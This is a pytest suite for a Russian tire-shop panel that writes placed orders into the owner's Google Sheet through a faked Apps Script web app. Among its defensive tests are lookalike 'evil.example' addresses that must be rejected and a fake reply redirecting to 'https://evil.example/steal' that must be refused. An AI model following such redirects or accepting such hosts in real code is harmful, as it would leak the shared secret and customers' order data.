"""The owner's Google table of orders, sheet «Заказы» (the owner 2026-10-23): rows of the placed orders, written by the web app of Apps
Script, kept up to date, never twice. A fake web app only: no request leaves the tests."""
from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
from pathlib import Path

import pytest
from cryptography.fernet import Fernet

from panel_helpers import make_app, post, shared_mark_of
from test_roles import person, sign_in
from test_webmim_create import NOW, card, db, point
from tires_sync import connections, order_report, order_sheet as sheet, order_templates as templates, orders, store, users
from tires_sync.secretbox import SecretBox

URL = "https://script.google.com/macros/s/AKfycbTEST_1234567890abc/exec"
SECRET = "s3cret-XYZ-1234567890"
LATER = "2026-10-23T12:30:00"


class FakeScript:
    """The web app of docs/integrations/google-sheet-apps-script.md: rows found by their hidden mark, the answer behind a redirect.
    `fail`: what the next POSTs do instead ("timeout", "500", "html")."""

    def __init__(self, columns=sheet.COLUMNS, secret=SECRET, legacy=False):
        self.columns, self.secret, self.legacy = list(columns), secret, legacy        # legacy: the script before 2026-11-02 (no shade, no extra)
        self.grey = set()                                                              # the rows filled grey
        self.rows, self.posts, self.fail, self.result, self.marks = {}, [], [], None, {}

    def __call__(self, method, url, headers, body):
        if method == "POST":
            assert url == URL and "secret" not in url
            payload = json.loads(body.decode("utf-8"))
            self.posts.append(payload)
            action = self.fail.pop(0) if self.fail else None
            if action == "timeout":
                raise OSError("timed out")
            if action == "500":
                return 500, {}, b""
            if action == "html":
                return 200, {"content-type": "text/html"}, "<html>Войдите в аккаунт Google</html>".encode("utf-8")
            self.result = self.run(payload)
            return 302, {"location": "https://script.googleusercontent.com/macros/echo?user_content_key=k1"}, b""
        assert method == "GET" and url.startswith("https://script.googleusercontent.com/")
        return 200, {"content-type": "application/json"}, json.dumps(self.result, ensure_ascii=False).encode("utf-8")

    def run(self, p):
        if p.get("secret") != self.secret:
            return {"ok": False, "error": "неверный секрет"}
        if p.get("ping"):
            return dict({"ok": True, "missing": [c for c in p["columns"] if c not in self.columns]}, **self.marks)
        out = []
        for row in p["rows"]:
            lacking = [c for c in row["fields"] if c not in self.columns]
            if lacking:
                out.append({"key": row["key"], "status": "error", "error": "нет колонок: " + ", ".join(lacking)})
                continue
            if row["key"] in self.rows and row.get("check") and any(self.rows[row["key"]].get(c) != v for c, v in row["check"].items()):
                out.append({"key": row["key"], "status": "missing"})                # rewritten by hand: not touched
                continue
            if row["key"] not in self.rows:
                if not row["create"]:
                    out.append({"key": row["key"], "status": "missing"})
                    continue
                self.rows[row["key"]] = {}
                status = "created"
            else:
                status = "updated"
            self.rows[row["key"]].update(row["fields"])
            if not self.legacy:
                self.rows[row["key"]].update({c: v for c, v in (row.get("extra") or {}).items() if c in self.columns})
                if row.get("shade") in (True, False):
                    (self.grey.add if row["shade"] else self.grey.discard)(row["key"])
                    out.append({"key": row["key"], "status": status, "shade": row["shade"]})
                    continue
            out.append({"key": row["key"], "status": status})
        return {"ok": True, "results": out}

    def data_posts(self):
        return [p for p in self.posts if "rows" in p]


def turn_on(conn, box, url=URL):
    sheet.save_settings(conn, url, True, NOW, "owner", secret_typed=True)
    connections.set_secret(conn, box, sheet.KIND, 0, "secret", SECRET, NOW, "owner")
    conn.commit()


def stage(conn, code):
    return next(s for s in orders.list_stages(conn) if s["code"] == code)


def placed(conn, **kw):
    mine = card(conn, **kw)
    orders.move_card(conn, mine, stage(conn, "placed")["id"], NOW, "owner")
    return mine


def events(conn, mine):
    return [e["text"] for e in reversed(orders.list_events(conn, mine)) if e["author"] == sheet.AUTHOR]        # the oldest first


@pytest.fixture
def table(tmp_path):
    conn = db(tmp_path)
    box = SecretBox(Fernet.generate_key())
    turn_on(conn, box)
    return conn, box, FakeScript()


# ---- which orders ---------------------------------------------------------------------------------------------------------------------

def test_an_order_joins_when_placed_while_the_table_is_on_and_never_before(tmp_path):
    conn = db(tmp_path)
    box = SecretBox(Fernet.generate_key())
    before = placed(conn)                                                  # placed before the table was switched on: never
    turn_on(conn, box)
    mine = placed(conn, client_name="Пётр")
    skipped = card(conn, client_name="Олег")
    orders.move_card(conn, skipped, stage(conn, "at_point")["id"], NOW, "owner")            # «Заказ оформлен» jumped over: placed all the same
    cancelled = card(conn, client_name="Анна")
    orders.move_card(conn, cancelled, stage(conn, "cancel")["id"], NOW, "owner", {"cancel_reason": "передумал"})
    queued = {r[0] for r in conn.execute("SELECT order_id FROM sheet_order")}
    assert queued == {mine, skipped}
    orders.move_card(conn, mine, stage(conn, "at_point")["id"], LATER, "owner")
    assert conn.execute("SELECT placed_at FROM sheet_order WHERE order_id = ?", (mine,)).fetchone()[0] == NOW      # the first placing stays
    for code in ("at_point", "done"):                                      # placed before the table, moved on after it: never
        orders.move_card(conn, before, stage(conn, code)["id"], LATER, "owner")
    assert conn.execute("SELECT 1 FROM sheet_order WHERE order_id = ?", (before,)).fetchone() is None
    sheet.save_settings(conn, URL, False, NOW, "owner")
    other = placed(conn, client_name="Ира")
    assert conn.execute("SELECT 1 FROM sheet_order WHERE order_id = ?", (other,)).fetchone() is None and before not in queued


def test_the_settings_take_only_an_address_of_apps_script(tmp_path):
    conn = db(tmp_path)
    for bad in ("http://script.google.com/macros/s/AKfycbTEST_1234567890abc/exec", "https://evil.example/macros/s/AKfycbTEST_1234567890abc/exec",
                "https://script.google.com/macros/s/AKfycbTEST_1234567890abc/exec?x=1", "https://script.google.com.evil.example/macros/s/AKfycbTEST_1/exec"):
        with pytest.raises(sheet.SheetError):
            sheet.save_settings(conn, bad, True, NOW, "owner")
    with pytest.raises(sheet.SheetError):
        sheet.save_settings(conn, "", True, NOW, "owner")
    with pytest.raises(sheet.SheetError):
        sheet.save_settings(conn, "https://script.google.com/a/macros/evil.example/x/s/AKfycbTEST_1234567890abc/exec", True, NOW, "owner")
    sheet.save_settings(conn, "https://script.google.com/a/macros/example.com/s/AKfycbTEST_1234567890abc/exec", True, NOW, "owner")
    sheet.save_settings(conn, URL, True, NOW, "owner")
    assert sheet.settings(conn) == {"url": URL, "enabled": True, "since": NOW, "secret_for": "", "keep_from": ""}    # keep_from: 2026-11-01
    sheet.save_settings(conn, URL, True, LATER, "owner")
    assert sheet.settings(conn)["since"] == NOW                                                 # saved again: still on since the first time


# ---- the rows -------------------------------------------------------------------------------------------------------------------------

def test_a_row_per_position_with_every_column(table):
    conn, box, fake = table
    mine = placed(conn, goods=(("111", 4), ("111", 1)), comment="Хочу сегодня")                 # one code twice: two rows
    orders.update_card(conn, mine, {"webmim_number": "1234567", "transfer_number": "26R-922352"}, NOW, "owner")
    rows = sheet.rows_of(conn, mine, NOW)
    items = orders.get_card(conn, mine)["items"]
    assert list(rows) == [sheet.key(mine, i["id"]) for i in items] and len(rows) == 2
    first = rows[sheet.key(mine, items[0]["id"])]
    assert set(first) == set(sheet.SENT + sheet.OPTIONAL) and "Дата" not in first and "Примечание" not in first     # «Примечание» is the owner's; «Дата» is gone
    assert sheet.COLUMNS[0] == "Дата счета" and "Дата" not in sheet.COLUMNS and "Дата" not in sheet.ASKED    # (the owner 2026-11-01)
    assert first == dict(first, **{"№ заказа MIM": "1234567", "Перемещение MIM": "26R-922352", "Артикул": "111",
                                   "Наименование": "Шина 111", "Кол-во": 4, "Цена MIM": 4000.0, "Сумма MIM": 16000.0, "Цена продажи": 5000.0,
                                   "Сумма продажи": 20000.0, "Имя": "Иван", "Телефон": "89111112233", "ПВЗ": "Гамма", "Этап": "Заказ оформлен",
                                   "Реализация": "", "Списание": False, "Прибыль %": "", "Прибыль ₽": "", "Уведомление точке": "",
                                   "Уведомление клиенту": ""})
    assert rows[sheet.key(mine, items[1]["id"])]["Кол-во"] == 1


@pytest.mark.parametrize("code, kind, letter", [("placed", "webmim", ""), ("at_point", "webmim", ""), ("done", "webmim", "Р"), ("done", "stock", "Б"),
                                                ("cancel", "webmim", ""), ("return", "webmim", ""), ("oth", "webmim", "О"),
                                                ("return_given", "webmim", "")])      # the owner 2026-11-02: «О» is «На ОТХ» only
def test_realization_follows_the_legend(table, code, kind, letter):
    conn, box, fake = table
    mine = placed(conn, deal_kind=kind)
    changes = {"cancel_reason": "отказ"} if code == "cancel" else {"return_kind": "client", "return_reason": "не подошли", "return_amount": "100"} if code == "return" else None
    orders.move_card(conn, mine, stage(conn, code)["id"], NOW, "owner", changes)
    assert {r["Реализация"] for r in sheet.rows_of(conn, mine, NOW).values()} == {letter}


def test_the_profit_is_the_analytics_one_and_the_rows_add_up_to_the_net(table):
    conn, box, fake = table
    mine = placed(conn, goods=(("111", 4), ("222", 2)))
    orders.move_card(conn, mine, stage(conn, "done")["id"], NOW, "owner")
    assert {r["Прибыль ₽"] for r in sheet.rows_of(conn, mine, NOW).values()} == {""}                  # no sale written: no profit
    orders.record_sales(conn, mine, "2026-10-23", NOW, "owner", "2026-10-23")
    rows = list(sheet.rows_of(conn, mine, NOW).values())
    report = order_report.build(conn, "2026-10-23", "2026-10-23")
    assert round(sum(r["Прибыль ₽"] for r in rows), 2) == report["total"]["net"] and report["total"]["fee"] == 75.0
    for r in rows:
        assert r["Прибыль %"] == round(r["Прибыль ₽"] * 100.0 / r["Сумма продажи"], 1)
    assert rows[0]["Прибыль ₽"] != rows[1]["Прибыль ₽"]                                               # the fee is shared by the sum of the sale
    orders.reverse_sales(conn, mine, NOW, "owner")
    assert {r["Прибыль ₽"] for r in sheet.rows_of(conn, mine, NOW).values()} == {""}


def test_the_notices_are_the_time_the_last_message_went(table):
    conn, box, fake = table
    templates.add_samples(conn)
    mine = placed(conn)
    ids = {t["name"]: t["id"] for t in templates.list_templates(conn)}
    def task(name, status, done_at, entered):
        conn.execute("INSERT INTO order_task (order_id, rule_id, entered_at, kind, arg, status, title, created_at, done_at) VALUES (?, 0, ?, 'message', ?, ?, ?, ?, ?)",
                     (mine, entered, str(ids[name]), status, name, NOW, done_at))
    task("Клиенту: заказ оформлен", "done", "2026-10-23T14:05:00", "a")
    task("Менеджеру: заказ оформлен", "skipped", "2026-10-23T14:06:00", "b")
    conn.commit()
    row = next(iter(sheet.rows_of(conn, mine, NOW).values()))
    assert row["Уведомление клиенту"] == "23.10.2026 14:05" and row["Уведомление точке"] == ""
    task("Менеджеру: заказ оформлен", "done", "2026-10-23T15:10:00", "c")
    conn.commit()
    assert next(iter(sheet.rows_of(conn, mine, NOW).values()))["Уведомление точке"] == "23.10.2026 15:10"


def test_the_invoice_day_is_the_day_of_the_webmim_order(table):
    conn, box, fake = table
    mine = placed(conn)
    assert next(iter(sheet.rows_of(conn, mine, NOW).values()))["Дата счета"] == ""
    conn.execute("INSERT INTO webmim_create (order_id, server, state, first_at, started_at, author, webmim_id, updated_at) VALUES (?, 'test', 'done', ?, ?, 'owner', '1001', '2026-10-22T18:00:00')",
                 (mine, NOW, NOW))
    assert next(iter(sheet.rows_of(conn, mine, NOW).values()))["Дата счета"] == "2026-10-22"                 # the moment the button made it
    conn.execute("INSERT INTO webmim_order (server, id, number, create_date, seen_at) VALUES ('test', '1001', '5001', '2026-10-21T11:00:00', ?)", (NOW,))
    assert next(iter(sheet.rows_of(conn, mine, NOW).values()))["Дата счета"] == "2026-10-21"                 # WebMIM's own date


def test_the_codes_written_off_are_the_tick(table):
    conn, box, fake = table
    mine = placed(conn)
    orders.update_card(conn, mine, {"codes_written_off_at": "2026-10-23"}, NOW, "owner")
    assert {r["Списание"] for r in sheet.rows_of(conn, mine, NOW).values()} == {True}


# ---- sending --------------------------------------------------------------------------------------------------------------------------

def test_the_first_send_makes_the_rows_and_a_second_look_sends_nothing(table):
    conn, box, fake = table
    mine = placed(conn)
    assert sheet.flush(conn, box, fake, NOW)
    assert len(fake.rows) == 2 and all(set(r) == set(sheet.SENT) for r in fake.rows.values())
    sent = fake.data_posts()[0]
    assert sent["secret"] == SECRET and sent["sheet"] == "Заказы" and all(r["create"] for r in sent["rows"])
    assert events(conn, mine) == ["Записано в Google-таблицу: 2 стр."]
    assert sheet.flush(conn, box, fake, LATER) == {} and sheet.flush(conn, box, fake, LATER, full=True) == {mine: "нечего отправлять"}
    assert len(fake.data_posts()) == 1


def test_a_change_sends_only_the_columns_that_follow_the_order(table):
    conn, box, fake = table
    mine = placed(conn, comment="Хочу сегодня")
    sheet.flush(conn, box, fake, NOW)
    orders.update_card(conn, mine, {"transfer_number": "26R-1", "client_name": "Иван Петров", "comment": "Сам доставил"}, LATER, "pavel")
    orders.move_card(conn, mine, stage(conn, "at_point")["id"], LATER, "pavel")
    sheet.flush(conn, box, fake, LATER)
    update = fake.data_posts()[-1]["rows"]
    assert len(update) == 2 and not any(r["create"] for r in update) and all(set(r["fields"]) == {"Перемещение MIM", "Этап"} for r in update)
    row = next(iter(fake.rows.values()))
    assert row["Имя"] == "Иван" and "Примечание" not in row and row["Этап"] == "На точке, ждём клиента" and row["Перемещение MIM"] == "26R-1"
    assert events(conn, mine)[-1] == "Google-таблица обновлена: Перемещение MIM, Этап."


def test_a_position_added_after_placing_is_a_new_row_and_a_removed_one_is_said(table):
    conn, box, fake = table
    mine = placed(conn)
    sheet.flush(conn, box, fake, NOW)
    items = orders.get_card(conn, mine)["items"]
    orders.add_item(conn, mine, goods_id="333", name="Шина 333", brand_key="b", season="summer", diameter=16, territory="t", qty=2, sale_unit=6000,
                    supplier_price=5000, terms=None, fee_pct=0, promo_pct=0, now=LATER, author="pavel")
    orders.remove_item(conn, items[1]["id"], LATER, "pavel")
    conn.commit()
    sheet.flush(conn, box, fake, LATER)
    last = fake.data_posts()[-1]["rows"]
    assert [r["create"] for r in last] == [True] and last[0]["fields"]["Артикул"] == "333" and len(fake.rows) == 3
    assert "Позиция убрана из заказа: её строку в Google-таблице поправьте вручную." in events(conn, mine)
    sheet.flush(conn, box, fake, "2026-10-23T13:00:00", full=True)
    assert events(conn, mine).count("Позиция убрана из заказа: её строку в Google-таблице поправьте вручную.") == 1


def test_a_failure_is_said_once_and_retried_later_without_a_double(table):
    conn, box, fake = table
    mine = placed(conn)
    fake.fail = ["timeout", "500", "html"]
    assert "ошибка" in sheet.flush(conn, box, fake, NOW)[mine]
    assert events(conn, mine) == ["Ошибка Google-таблицы: Google не ответил (OSError): повторим позже."]
    row = conn.execute("SELECT failing, next_at FROM sheet_order WHERE order_id = ?", (mine,)).fetchone()
    assert row == (1, "2026-10-23T12:01:00")
    assert sheet.flush(conn, box, fake, "2026-10-23T12:00:30") == {} and len(fake.posts) == 1                   # not before its time
    sheet.flush(conn, box, fake, "2026-10-23T12:01:00")                                                         # 500
    sheet.flush(conn, box, fake, "2026-10-23T12:06:00")                                                         # a page of Google, not the script
    assert conn.execute("SELECT failing, next_at FROM sheet_order WHERE order_id = ?", (mine,)).fetchone() == (3, "2026-10-23T12:21:00")
    assert len(events(conn, mine)) == 1                                                                       # once per streak
    assert "страница Google" in conn.execute("SELECT error FROM sheet_order WHERE order_id = ?", (mine,)).fetchone()[0]
    sheet.flush(conn, box, fake, "2026-10-23T12:21:00")
    assert len(fake.rows) == 2 and events(conn, mine)[-1] == "Записано в Google-таблицу: 2 стр."
    assert conn.execute("SELECT failing, next_at, error FROM sheet_order WHERE order_id = ?", (mine,)).fetchone() == (0, "", "")


def test_an_answer_lost_after_the_rows_were_made_makes_no_double(table):
    conn, box, fake = table
    mine = placed(conn)
    real = fake.__call__
    def lost(method, url, headers, body):
        answer = real(method, url, headers, body)
        if method == "GET" and len(fake.data_posts()) == 1:
            raise OSError("timed out")                                    # the script wrote the rows, the panel never heard it
        return answer
    sheet.flush(conn, box, lost, NOW)
    assert len(fake.rows) == 2 and "Ошибка Google-таблицы" in events(conn, mine)[0]
    sheet.flush(conn, box, lost, "2026-10-23T12:01:00")
    assert len(fake.rows) == 2 and all(r["create"] for r in fake.data_posts()[-1]["rows"])                 # sent again: the mark finds the rows
    assert events(conn, mine)[-1] == "Записано в Google-таблицу: 2 стр."


def test_a_row_the_owner_deleted_is_not_made_again(table):
    conn, box, fake = table
    mine = placed(conn)
    sheet.flush(conn, box, fake, NOW)
    gone = sorted(fake.rows)[0]
    del fake.rows[gone]
    orders.move_card(conn, mine, stage(conn, "at_point")["id"], LATER, "pavel")
    sheet.flush(conn, box, fake, LATER)
    assert gone not in fake.rows and len(fake.rows) == 1
    assert any("Строка Google-таблицы изменена или удалена вручную (другой артикул или строки нет): 1 стр." in e for e in events(conn, mine))
    orders.move_card(conn, mine, stage(conn, "done")["id"], "2026-10-23T13:00:00", "pavel")
    sheet.flush(conn, box, fake, "2026-10-23T13:00:00")
    assert [r["key"] for r in fake.data_posts()[-1]["rows"]] == [k for k in fake.rows] and gone not in fake.rows


def test_a_missing_column_or_a_wrong_secret_is_said_and_retried(table):
    conn, box, fake = table
    mine = placed(conn)
    fake.columns.remove("Списание")
    sheet.flush(conn, box, fake, NOW)
    assert fake.rows == {} and events(conn, mine) == ["Google-таблица не приняла 2 стр. (нет колонок: Списание): отправим ещё раз."]
    fake.columns.append("Списание")
    fake.secret = "другой"
    sheet.flush(conn, box, fake, "2026-10-23T12:01:00")
    assert len(events(conn, mine)) == 1                                                                         # still the same streak
    assert conn.execute("SELECT error FROM sheet_order WHERE order_id = ?", (mine,)).fetchone()[0] == "Скрипт отказал: неверный секрет"
    fake.secret = SECRET
    sheet.flush(conn, box, fake, "2026-10-23T12:06:00")
    assert len(fake.rows) == 2


def test_a_redirect_elsewhere_is_refused(table):
    conn, box, fake = table
    placed(conn)
    def evil(method, url, headers, body):
        if method == "POST":
            return 302, {"location": "https://evil.example/steal"}, b""
        raise AssertionError("never followed")
    assert "переадресовал" in next(iter(sheet.flush(conn, box, evil, NOW).values()))


def test_an_order_being_sent_is_not_taken_twice(table):
    conn, box, fake = table
    mine = placed(conn)
    assert sheet._claim(conn, mine, NOW)                                    # another process took it a moment ago
    assert not sheet._claim(conn, mine, NOW)
    assert sheet.flush(conn, box, fake, "2026-10-23T12:01:00") == {} and fake.posts == []
    assert sheet.flush(conn, box, fake, "2026-10-23T12:04:00")                                               # its claim ran out: taken
    assert conn.execute("SELECT claim_until FROM sheet_order WHERE order_id = ?", (mine,)).fetchone()[0] == ""


def test_nothing_goes_when_off_or_without_a_secret(tmp_path):
    conn = db(tmp_path)
    box = SecretBox(Fernet.generate_key())
    sheet.save_settings(conn, URL, True, NOW, "owner")
    placed(conn)
    fake = FakeScript()
    assert sheet.flush(conn, box, fake, NOW) == {} and fake.posts == []                                    # no secret
    connections.set_secret(conn, box, sheet.KIND, 0, "secret", SECRET, NOW, "owner")
    sheet.save_settings(conn, URL, False, NOW, "owner")
    assert sheet.flush(conn, box, fake, NOW) == {} and sheet.flush(conn, None, fake, NOW) == {} and fake.posts == []


def test_the_check_says_what_the_sheet_lacks(table):
    conn, box, fake = table
    assert sheet.check(conn, box, fake) == "Таблица отвечает: лист «Заказы», все колонки на месте."
    fake.columns = [c for c in fake.columns if c not in ("Прибыль %", "ПВЗ")]
    with pytest.raises(sheet.SheetError, match="нет колонок: ПВЗ, Прибыль %"):
        sheet.check(conn, box, fake)


# ---- the panel ------------------------------------------------------------------------------------------------------------------------

@pytest.fixture
def panel(tmp_path, monkeypatch):
    monkeypatch.setattr(users, "HASH_METHOD", "pbkdf2:sha256:1000")
    box, fake = SecretBox(Fernet.generate_key()), FakeScript()
    app = make_app(tmp_path, SECRET_BOX=box, SHEET_HTTP=fake, SHEET_RUN=lambda work: work())
    conn = store.connect(app.config["DB_PATH"])
    orders.ensure_pipeline(conn, NOW)
    conn.commit()
    client = app.test_client()
    with client.session_transaction() as session:
        session["user"], session["epoch"], session["csrf"] = "owner", 0, "tok"
        session["pw"] = shared_mark_of(client.application)
    return app, conn, box, fake, client


def test_the_tab_saves_the_address_and_an_encrypted_secret_and_checks(panel):
    app, conn, box, fake, client = panel
    page = client.get("/connections/sheet").get_data(as_text=True)
    assert 'href="/connections/sheet" class="is-active"' in page and "Google-таблица заказов" in page and "не задан" in page
    r = client.post("/connections/sheet", data={"csrf": "tok", "url": URL, "secret": SECRET, "enabled": "1"})
    assert r.status_code == 302
    assert sheet.settings(conn)["enabled"] and connections.get_secret(conn, box, sheet.KIND, 0, "secret") == SECRET
    stored = conn.execute("SELECT ciphertext FROM secret WHERE kind = ?", (sheet.KIND,)).fetchone()[0]
    assert SECRET not in str(stored)
    page = client.get("/connections/sheet").get_data(as_text=True)
    assert SECRET not in page and "задан (" in page and URL in page
    post(client, "/connections/sheet/check", "tok")
    assert connections.get_check(conn, sheet.KIND, 0)["status"] == "ok: Таблица отвечает: лист «Заказы», все колонки на месте."
    audit = " ".join(str(r) for r in conn.execute("SELECT * FROM audit"))
    assert SECRET not in audit
    client.post("/connections/sheet", data={"csrf": "tok", "url": "https://evil.example/x", "secret": "", "enabled": "1"})
    assert sheet.settings(conn)["url"] == URL                                                             # a wrong address is not saved


def test_only_the_rights_of_connections_reach_the_tab(panel):
    app, conn, box, fake, client = panel
    pid = point(conn)
    conn.commit()
    partner, _ = person(app, "partner")                                    # «Настройка» to look at, no right «connections»
    assert partner.get("/connections/sheet").status_code == 200
    assert partner.post("/connections/sheet", data={"csrf": "tok", "url": URL, "enabled": "1"}).status_code == 403
    assert partner.post("/connections/sheet/check", data={"csrf": "tok"}).status_code == 403
    viewer, _ = person(app, "viewer")
    assert viewer.get("/connections/sheet").status_code == 403
    manager, _ = person(app, "point", point_id=pid)
    assert manager.get("/connections/sheet").status_code in (302, 403)
    assert sheet.settings(conn)["url"] == ""


def test_a_move_in_the_panel_sends_the_rows_after_the_answer(panel):
    app, conn, box, fake, client = panel
    turn_on(conn, box)
    mine = card(conn)
    post(client, "/orders/%d/move" % mine, "tok", stage_id=str(stage(conn, "placed")["id"]))
    assert orders.get_card(conn, mine)["stage"]["code"] == "placed" and len(fake.rows) == 2
    assert events(conn, mine) == ["Записано в Google-таблицу: 2 стр."]


def test_the_tick_of_the_window_marks_the_codes_and_the_table_follows(panel):
    app, conn, box, fake, client = panel
    turn_on(conn, box)
    mine = card(conn)
    orders.move_card(conn, mine, stage(conn, "placed")["id"], NOW, "owner")
    page = client.get("/orders/%d" % mine).get_data(as_text=True)
    assert 'name="codes_written_off" value="1">' in page and 'name="codes_written_off_was" value="0"' in page
    post(client, "/orders/%d/save" % mine, "tok", codes_written_off="1", codes_written_off_was="0")
    assert orders.get_card(conn, mine)["codes_written_off_at"] == "2026-10-07"                     # the panel's day (panel_helpers' clock)
    assert all(r["Списание"] is True for r in fake.rows.values())
    post(client, "/orders/%d/save" % mine, "tok", codes_written_off_was="0")                          # a page that showed it off: no change
    assert orders.get_card(conn, mine)["codes_written_off_at"] == "2026-10-07"
    post(client, "/orders/%d/save" % mine, "tok", codes_written_off_was="1")                          # taken off
    assert orders.get_card(conn, mine)["codes_written_off_at"] == ""
    assert all(r["Списание"] is False for r in fake.rows.values())
    assert "Google-таблица обновлена: Списание." in events(conn, mine)


# ---- the script of the owner ----------------------------------------------------------------------------------------------------------

# the script is the owner's and stays private: in docs/ now, in private/docs/ once the code is open; a copy without it skips these tests,
# unless TIRES_REQUIRE_PRIVATE_DOCS=1 (the owner's runner, .github/workflows/tests.yml): there a missing script fails them
DOCS = [Path(__file__).resolve().parent.parent / d / "integrations" / "google-sheet-apps-script.md" for d in ("docs", "private/docs")]
REQUIRE_ENV = "TIRES_REQUIRE_PRIVATE_DOCS"


def doc_text(docs=None):
    found = [p for p in (DOCS if docs is None else docs) if p.exists()]
    if not found:
        why = "the owner's Apps Script is private (docs/ or private/docs/), not in this copy"
        if os.environ.get(REQUIRE_ENV) == "1":
            pytest.fail(f"{why}, and {REQUIRE_ENV}=1 says it must be here")
        pytest.skip(why)
    return found[0].read_text(encoding="utf-8")


def test_a_missing_script_skips_in_a_public_copy_and_fails_where_it_is_required(tmp_path, monkeypatch):
    nowhere = [tmp_path / "docs" / "x.md", tmp_path / "private" / "docs" / "x.md"]
    monkeypatch.delenv(REQUIRE_ENV, raising=False)
    with pytest.raises(pytest.skip.Exception):
        doc_text(nowhere)
    monkeypatch.setenv(REQUIRE_ENV, "0")
    with pytest.raises(pytest.skip.Exception):
        doc_text(nowhere)
    monkeypatch.setenv(REQUIRE_ENV, "1")
    with pytest.raises(pytest.fail.Exception, match=REQUIRE_ENV):
        doc_text(nowhere)
    nowhere[1].parent.mkdir(parents=True)
    nowhere[1].write_text("скрипт", encoding="utf-8")                  # private/docs/ is enough once the code is open
    assert doc_text(nowhere) == "скрипт"


def script_text():
    text = doc_text()
    return re.search(r"```javascript\n(.*?)```", text, re.S).group(1)


def test_the_script_knows_the_columns_of_the_panel():
    code = script_text()
    for name in re.findall(r"'([^']+)'", re.search(r"var DAYS = \[(.*?)\];", code).group(1)) + ["Списание", "Дата счета"]:
        assert name in sheet.COLUMNS, name
    assert "var KEY_COLUMN = 'tires_id';" in code and "function removeApostrophes()" in code and "hideColumns" in code   # 2026-11-01
    assert "function selfTest()" in code and "function marksBackForRollback()" in code and "/^=/.test(value)" in code
    for name in re.findall(r"'([^']+)'", re.search(r"var PANEL_COLUMNS = \[(.*?)\];", code, re.S).group(1)):
        assert name in sheet.COLUMNS, name
    assert "body.secret !== secret" in code and "LockService" in code and "row.create" in code and "typeof value === 'string'" in code
    assert "row.shade" in code and "setBackground" in code and "row.extra" in code and "body.optional" in code   # 2026-11-02
    assert "deleteRow" not in code and "row.delete" not in code                                                     # rows are never taken out
    doc = doc_text()
    for name in sheet.COLUMNS:
        assert name in doc, name


@pytest.mark.skipif(shutil.which("node") is None, reason="node is not installed")
def test_the_script_is_valid_javascript(tmp_path):
    path = tmp_path / "Code.js"
    path.write_text(script_text(), encoding="utf-8")
    subprocess.run(["node", "--check", str(path)], check=True, capture_output=True)


def test_the_webmim_button_puts_the_order_in_the_table(tmp_path, monkeypatch):
    from test_order_placed import panel as placed_panel, ready
    app, conn, webmim, avito, box, client = placed_panel.__wrapped__(tmp_path, monkeypatch)
    fake = FakeScript()
    app.config.update(SHEET_HTTP=fake, SHEET_RUN=lambda work: work())
    turn_on(conn, box)
    mine = ready(conn, chat=False)
    assert post(client, "/orders/%d/webmim/create" % mine, "tok").status_code == 302
    assert orders.get_card(conn, mine)["webmim_id"] and conn.execute("SELECT 1 FROM sheet_order WHERE order_id = ?", (mine,)).fetchone()
    assert len(fake.rows) == 2 and {r["№ заказа MIM"] for r in fake.rows.values()} == {orders.get_card(conn, mine)["webmim_number"] or orders.get_card(conn, mine)["webmim_id"]}
    assert "Записано в Google-таблицу: 2 стр." in events(conn, mine)


# ---- only the orders on «Заказ оформлен» or later (the owner 2026-11-02) ----------------------------------------------------------------

LATEST = "2026-10-23T13:00:00"


def own_stage(conn, before_placed):
    """A stage of the owner: last in the pipeline (after «Вернули поставщику»), or moved up to stand right before «Заказ оформлен»."""
    mine = orders.add_stage(conn, "Свой этап", "#123456", "open", "", 0)
    while before_placed and [s["id"] for s in orders.list_stages(conn)].index(mine) > [s["code"] for s in orders.list_stages(conn)].index("placed"):
        orders.shift_stage(conn, mine, -1)
    return orders.get_stage(conn, mine)


def test_the_table_takes_an_order_by_the_position_of_its_stage(table):
    conn, box, fake = table
    before, after = own_stage(conn, True), own_stage(conn, False)
    assert not orders._needs_placed(before, orders._placed_stage(conn))
    early, late, fresh = card(conn), card(conn, client_name="Пётр"), card(conn, client_name="Олег")
    orders.move_card(conn, early, before["id"], NOW, "owner")
    orders.move_card(conn, late, after["id"], NOW, "owner")
    sheet.enroll(conn, fresh, NOW)                                         # «Новый заказ»: an enroll of the caller puts nothing in
    assert {r[0] for r in conn.execute("SELECT order_id FROM sheet_order")} == {late}
    assert [sheet.listed(conn, c) for c in (early, late, fresh)] == [False, True, False]
    for code in ("placed", "moving", "at_point", "oth", "return_given", "done", "cancel", "return"):
        conn.execute("UPDATE order_card SET stage_id = ? WHERE id = ?", (stage(conn, code)["id"], fresh))
        assert sheet.listed(conn, fresh), code
    for code in ("new", "talk", "wait"):
        conn.execute("UPDATE order_card SET stage_id = ? WHERE id = ?", (stage(conn, code)["id"], fresh))
        assert not sheet.listed(conn, fresh), code


def test_reordering_the_system_stages_takes_no_order_out(table):
    conn, box, fake = table                                                # the review of 2026-11-02: a cosmetic edit of the pipeline
    moving, cancelled = placed(conn), placed(conn, client_name="Пётр")
    orders.move_card(conn, moving, stage(conn, "moving")["id"], NOW, "owner")
    orders.move_card(conn, cancelled, stage(conn, "cancel")["id"], NOW, "owner", {"cancel_reason": "передумал"})
    orders.shift_stage(conn, stage(conn, "placed")["id"], +1)              # «Заказ оформлен» below «Едет на точку»
    while [s["code"] for s in orders.list_stages(conn)].index("cancel") > [s["code"] for s in orders.list_stages(conn)].index("placed"):
        orders.shift_stage(conn, stage(conn, "cancel")["id"], -1)          # «Отмена» above «Заказ оформлен»
    assert sheet.listed(conn, moving) and sheet.listed(conn, cancelled)
    conn.execute("UPDATE order_card SET stage_id = ? WHERE id = ?", (stage(conn, "talk")["id"], moving))
    orders.shift_stage(conn, stage(conn, "talk")["id"], +1)
    while [s["code"] for s in orders.list_stages(conn)].index("talk") < [s["code"] for s in orders.list_stages(conn)].index("placed"):
        orders.shift_stage(conn, stage(conn, "talk")["id"], +1)            # «Переговоры» moved after it is still before placing
    assert not sheet.listed(conn, moving)


def test_an_order_moved_back_has_its_rows_filled_grey_and_placed_again_cleared(table):
    conn, box, fake = table
    mine = placed(conn)
    sheet.flush(conn, box, fake, NOW)
    assert len(fake.rows) == 2 and fake.grey == set()
    orders.move_card(conn, mine, stage(conn, "new")["id"], LATER, "owner")
    sheet.flush(conn, box, fake, LATER)
    ops = fake.data_posts()[-1]["rows"]
    assert all(op["shade"] is True and set(op["check"]) == set(sheet.CHECK) and op["fields"] == {"Этап": "Новый заказ"} for op in ops) and len(ops) == 2
    assert len(fake.rows) == 2 and fake.grey == set(fake.rows) and {r["Этап"] for r in fake.rows.values()} == {"Новый заказ"}   # never taken out
